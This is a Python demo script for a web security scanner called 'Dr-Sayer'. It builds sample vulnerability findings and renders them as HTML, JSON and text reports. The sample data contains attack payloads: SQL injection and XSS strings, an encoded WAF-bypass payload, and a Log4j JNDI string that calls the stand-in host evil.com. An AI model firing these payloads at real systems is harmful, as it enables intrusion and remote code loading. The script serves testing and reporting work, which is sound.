#!/usr/bin/env python3
"""
Dr-Sayer Security Tool Demo
Author: SayerLinux (SayerLinux@outlook.sa)
Demonstrates the tool's capabilities with sample data
"""

import sys
import os
from datetime import datetime

# Add the current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

def demo_report_generation():
    """Demonstrate report generation with sample findings"""
    print("🔒 Dr-Sayer Security Tool - Demo Mode")
    print("=" * 60)
    
    # Import modules
    from modules.reporter import SecurityReporter
    
    # Create sample findings
    sample_findings = [
        {
            'type': 'SQL Injection',
            'severity': 'High',
            'description': 'SQL injection vulnerability detected in parameter: id',
            'parameter': 'id',
            'payload': "' OR 1=1--",
            'database': 'MySQL',
            'evidence': "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
            'url': 'http://example.com/products.php?id=1',
            'method': 'GET',
            'module': 'SQL Injection'
        },
        {
            'type': 'Cross-Site Scripting (XSS)',
            'severity': 'High',
            'description': 'XSS vulnerability found in parameter: search',
            'parameter': 'search',
            'payload': '<script>alert("XSS")</script>',
            'context': 'exact',
            'evidence': '<div>Search results for: <script>alert("XSS")</script></div>',
            'url': 'http://example.com/search.php?q=test',
            'method': 'GET',
            'module': 'Cross-Site Scripting (XSS)'
        },
        {
            'type': 'Log4j Injection (CVE-2021-44228)',
            'severity': 'Critical',
            'description': 'Log4j vulnerability detected - JNDI injection possible',
            'payload': '${jndi:ldap://evil.com/a}',
            'location': 'Header: User-Agent',
            'evidence': 'javax.naming.CommunicationException',
            'response_time': 4.2,
            'status_code': 500,
            'module': 'Log4j Injection (CVE-2021-44228)',
            'cve_reference': 'CVE-2021-44228'
        },
        {
            'type': 'WAF Bypass',
            'severity': 'Medium',
            'description': 'WAF bypass successful using encoding techniques',
            'payload': '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
            'technique': 'Encoding Bypass',
            'evidence': 'Payload successfully bypassed WAF filters',
            'module': 'WAF Bypass Techniques'
        }
    ]
    
    # Create reporter
    reporter = SecurityReporter()
    
    print(f"📊 Generating reports for {len(sample_findings)} sample findings...")
    
    # Generate HTML report
    print("📝 Generating HTML report...")
    html_path = reporter.generate_report(sample_findings, datetime.now(), 'html', 'demo_report.html')
    print(f"✅ HTML report generated: {html_path}")
    
    # Generate JSON report
    print("📝 Generating JSON report...")
    json_path = reporter.generate_report(sample_findings, datetime.now(), 'json', 'demo_report.json')
    print(f"✅ JSON report generated: {json_path}")
    
    # Generate Text report
    print("📝 Generating Text report...")
    txt_path = reporter.generate_report(sample_findings, datetime.now(), 'txt', 'demo_report.txt')
    print(f"✅ Text report generated: {txt_path}")
    
    print("\\n📈 Report Statistics:")
    print(f"   Total Findings: {len(sample_findings)}")
    print(f"   Critical: 1")
    print(f"   High: 2") 
    print(f"   Medium: 1")
    
    return True

def demo_module_capabilities():
    """Demonstrate module capabilities"""
    print("\\n🔍 Demonstrating Module Capabilities")
    print("=" * 60)
    
    # SQL Injection Module
    print("📊 SQL Injection Module:")
    print("   ✅ Error-based detection")
    print("   ✅ Union-based testing")
    print("   ✅ Time-based blind injection")
    print("   ✅ Database-specific payloads (MySQL, MSSQL, Oracle, PostgreSQL)")
    print("   ✅ Parameter discovery and testing")
    
    # XSS Module
    print("\\n📊 XSS Testing Module:")
    print("   ✅ Reflected XSS detection")
    print("   ✅ Stored XSS testing")
    print("   ✅ DOM-based XSS analysis")
    print("   ✅ Multiple payload categories (basic, encoded, advanced, polyglot)")
    print("   ✅ Form-based testing")
    
    # Log4j Module
    print("\\n📊 Log4j Testing Module:")
    print("   ✅ JNDI injection payloads")
    print("   ✅ Header-based testing")
    print("   ✅ Parameter-based testing")
    print("   ✅ Time-based detection")
    print("   ✅ Obfuscation techniques")
    
    # WAF Bypass Module
    print("\\n📊 WAF Bypass Module:")
    print("   ✅ Case variation techniques")
    print("   ✅ Encoding bypass methods")
    print("   ✅ Comment insertion")
    print("   ✅ Whitespace manipulation")
    print("   ✅ Payload fragmentation")
    
    return True

def main():
    """Main demo function"""
    print("🚀 Starting Dr-Sayer Security Tool Demo")
    print("=" * 60)
    
    try:
        # Demo report generation
        demo_report_generation()
        
        # Demo module capabilities
        demo_module_capabilities()
        
        print("\\n" + "=" * 60)
        print("✅ Demo completed successfully!")
        print("\\n🎯 Tool Features:")
        print("   • Comprehensive security testing")
        print("   • Professional reporting system")
        print("   • Multiple output formats (HTML, JSON, TXT)")
        print("   • Advanced vulnerability detection")
        print("   • WAF bypass techniques")
        print("   • Legal and ethical usage guidelines")
        
        print("\\n📧 Contact: SayerLinux@outlook.sa")
        print("⚠️  Remember: For authorized testing only!")
        
        return True
        
    except Exception as e:
        print(f"❌ Demo failed: {e}")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)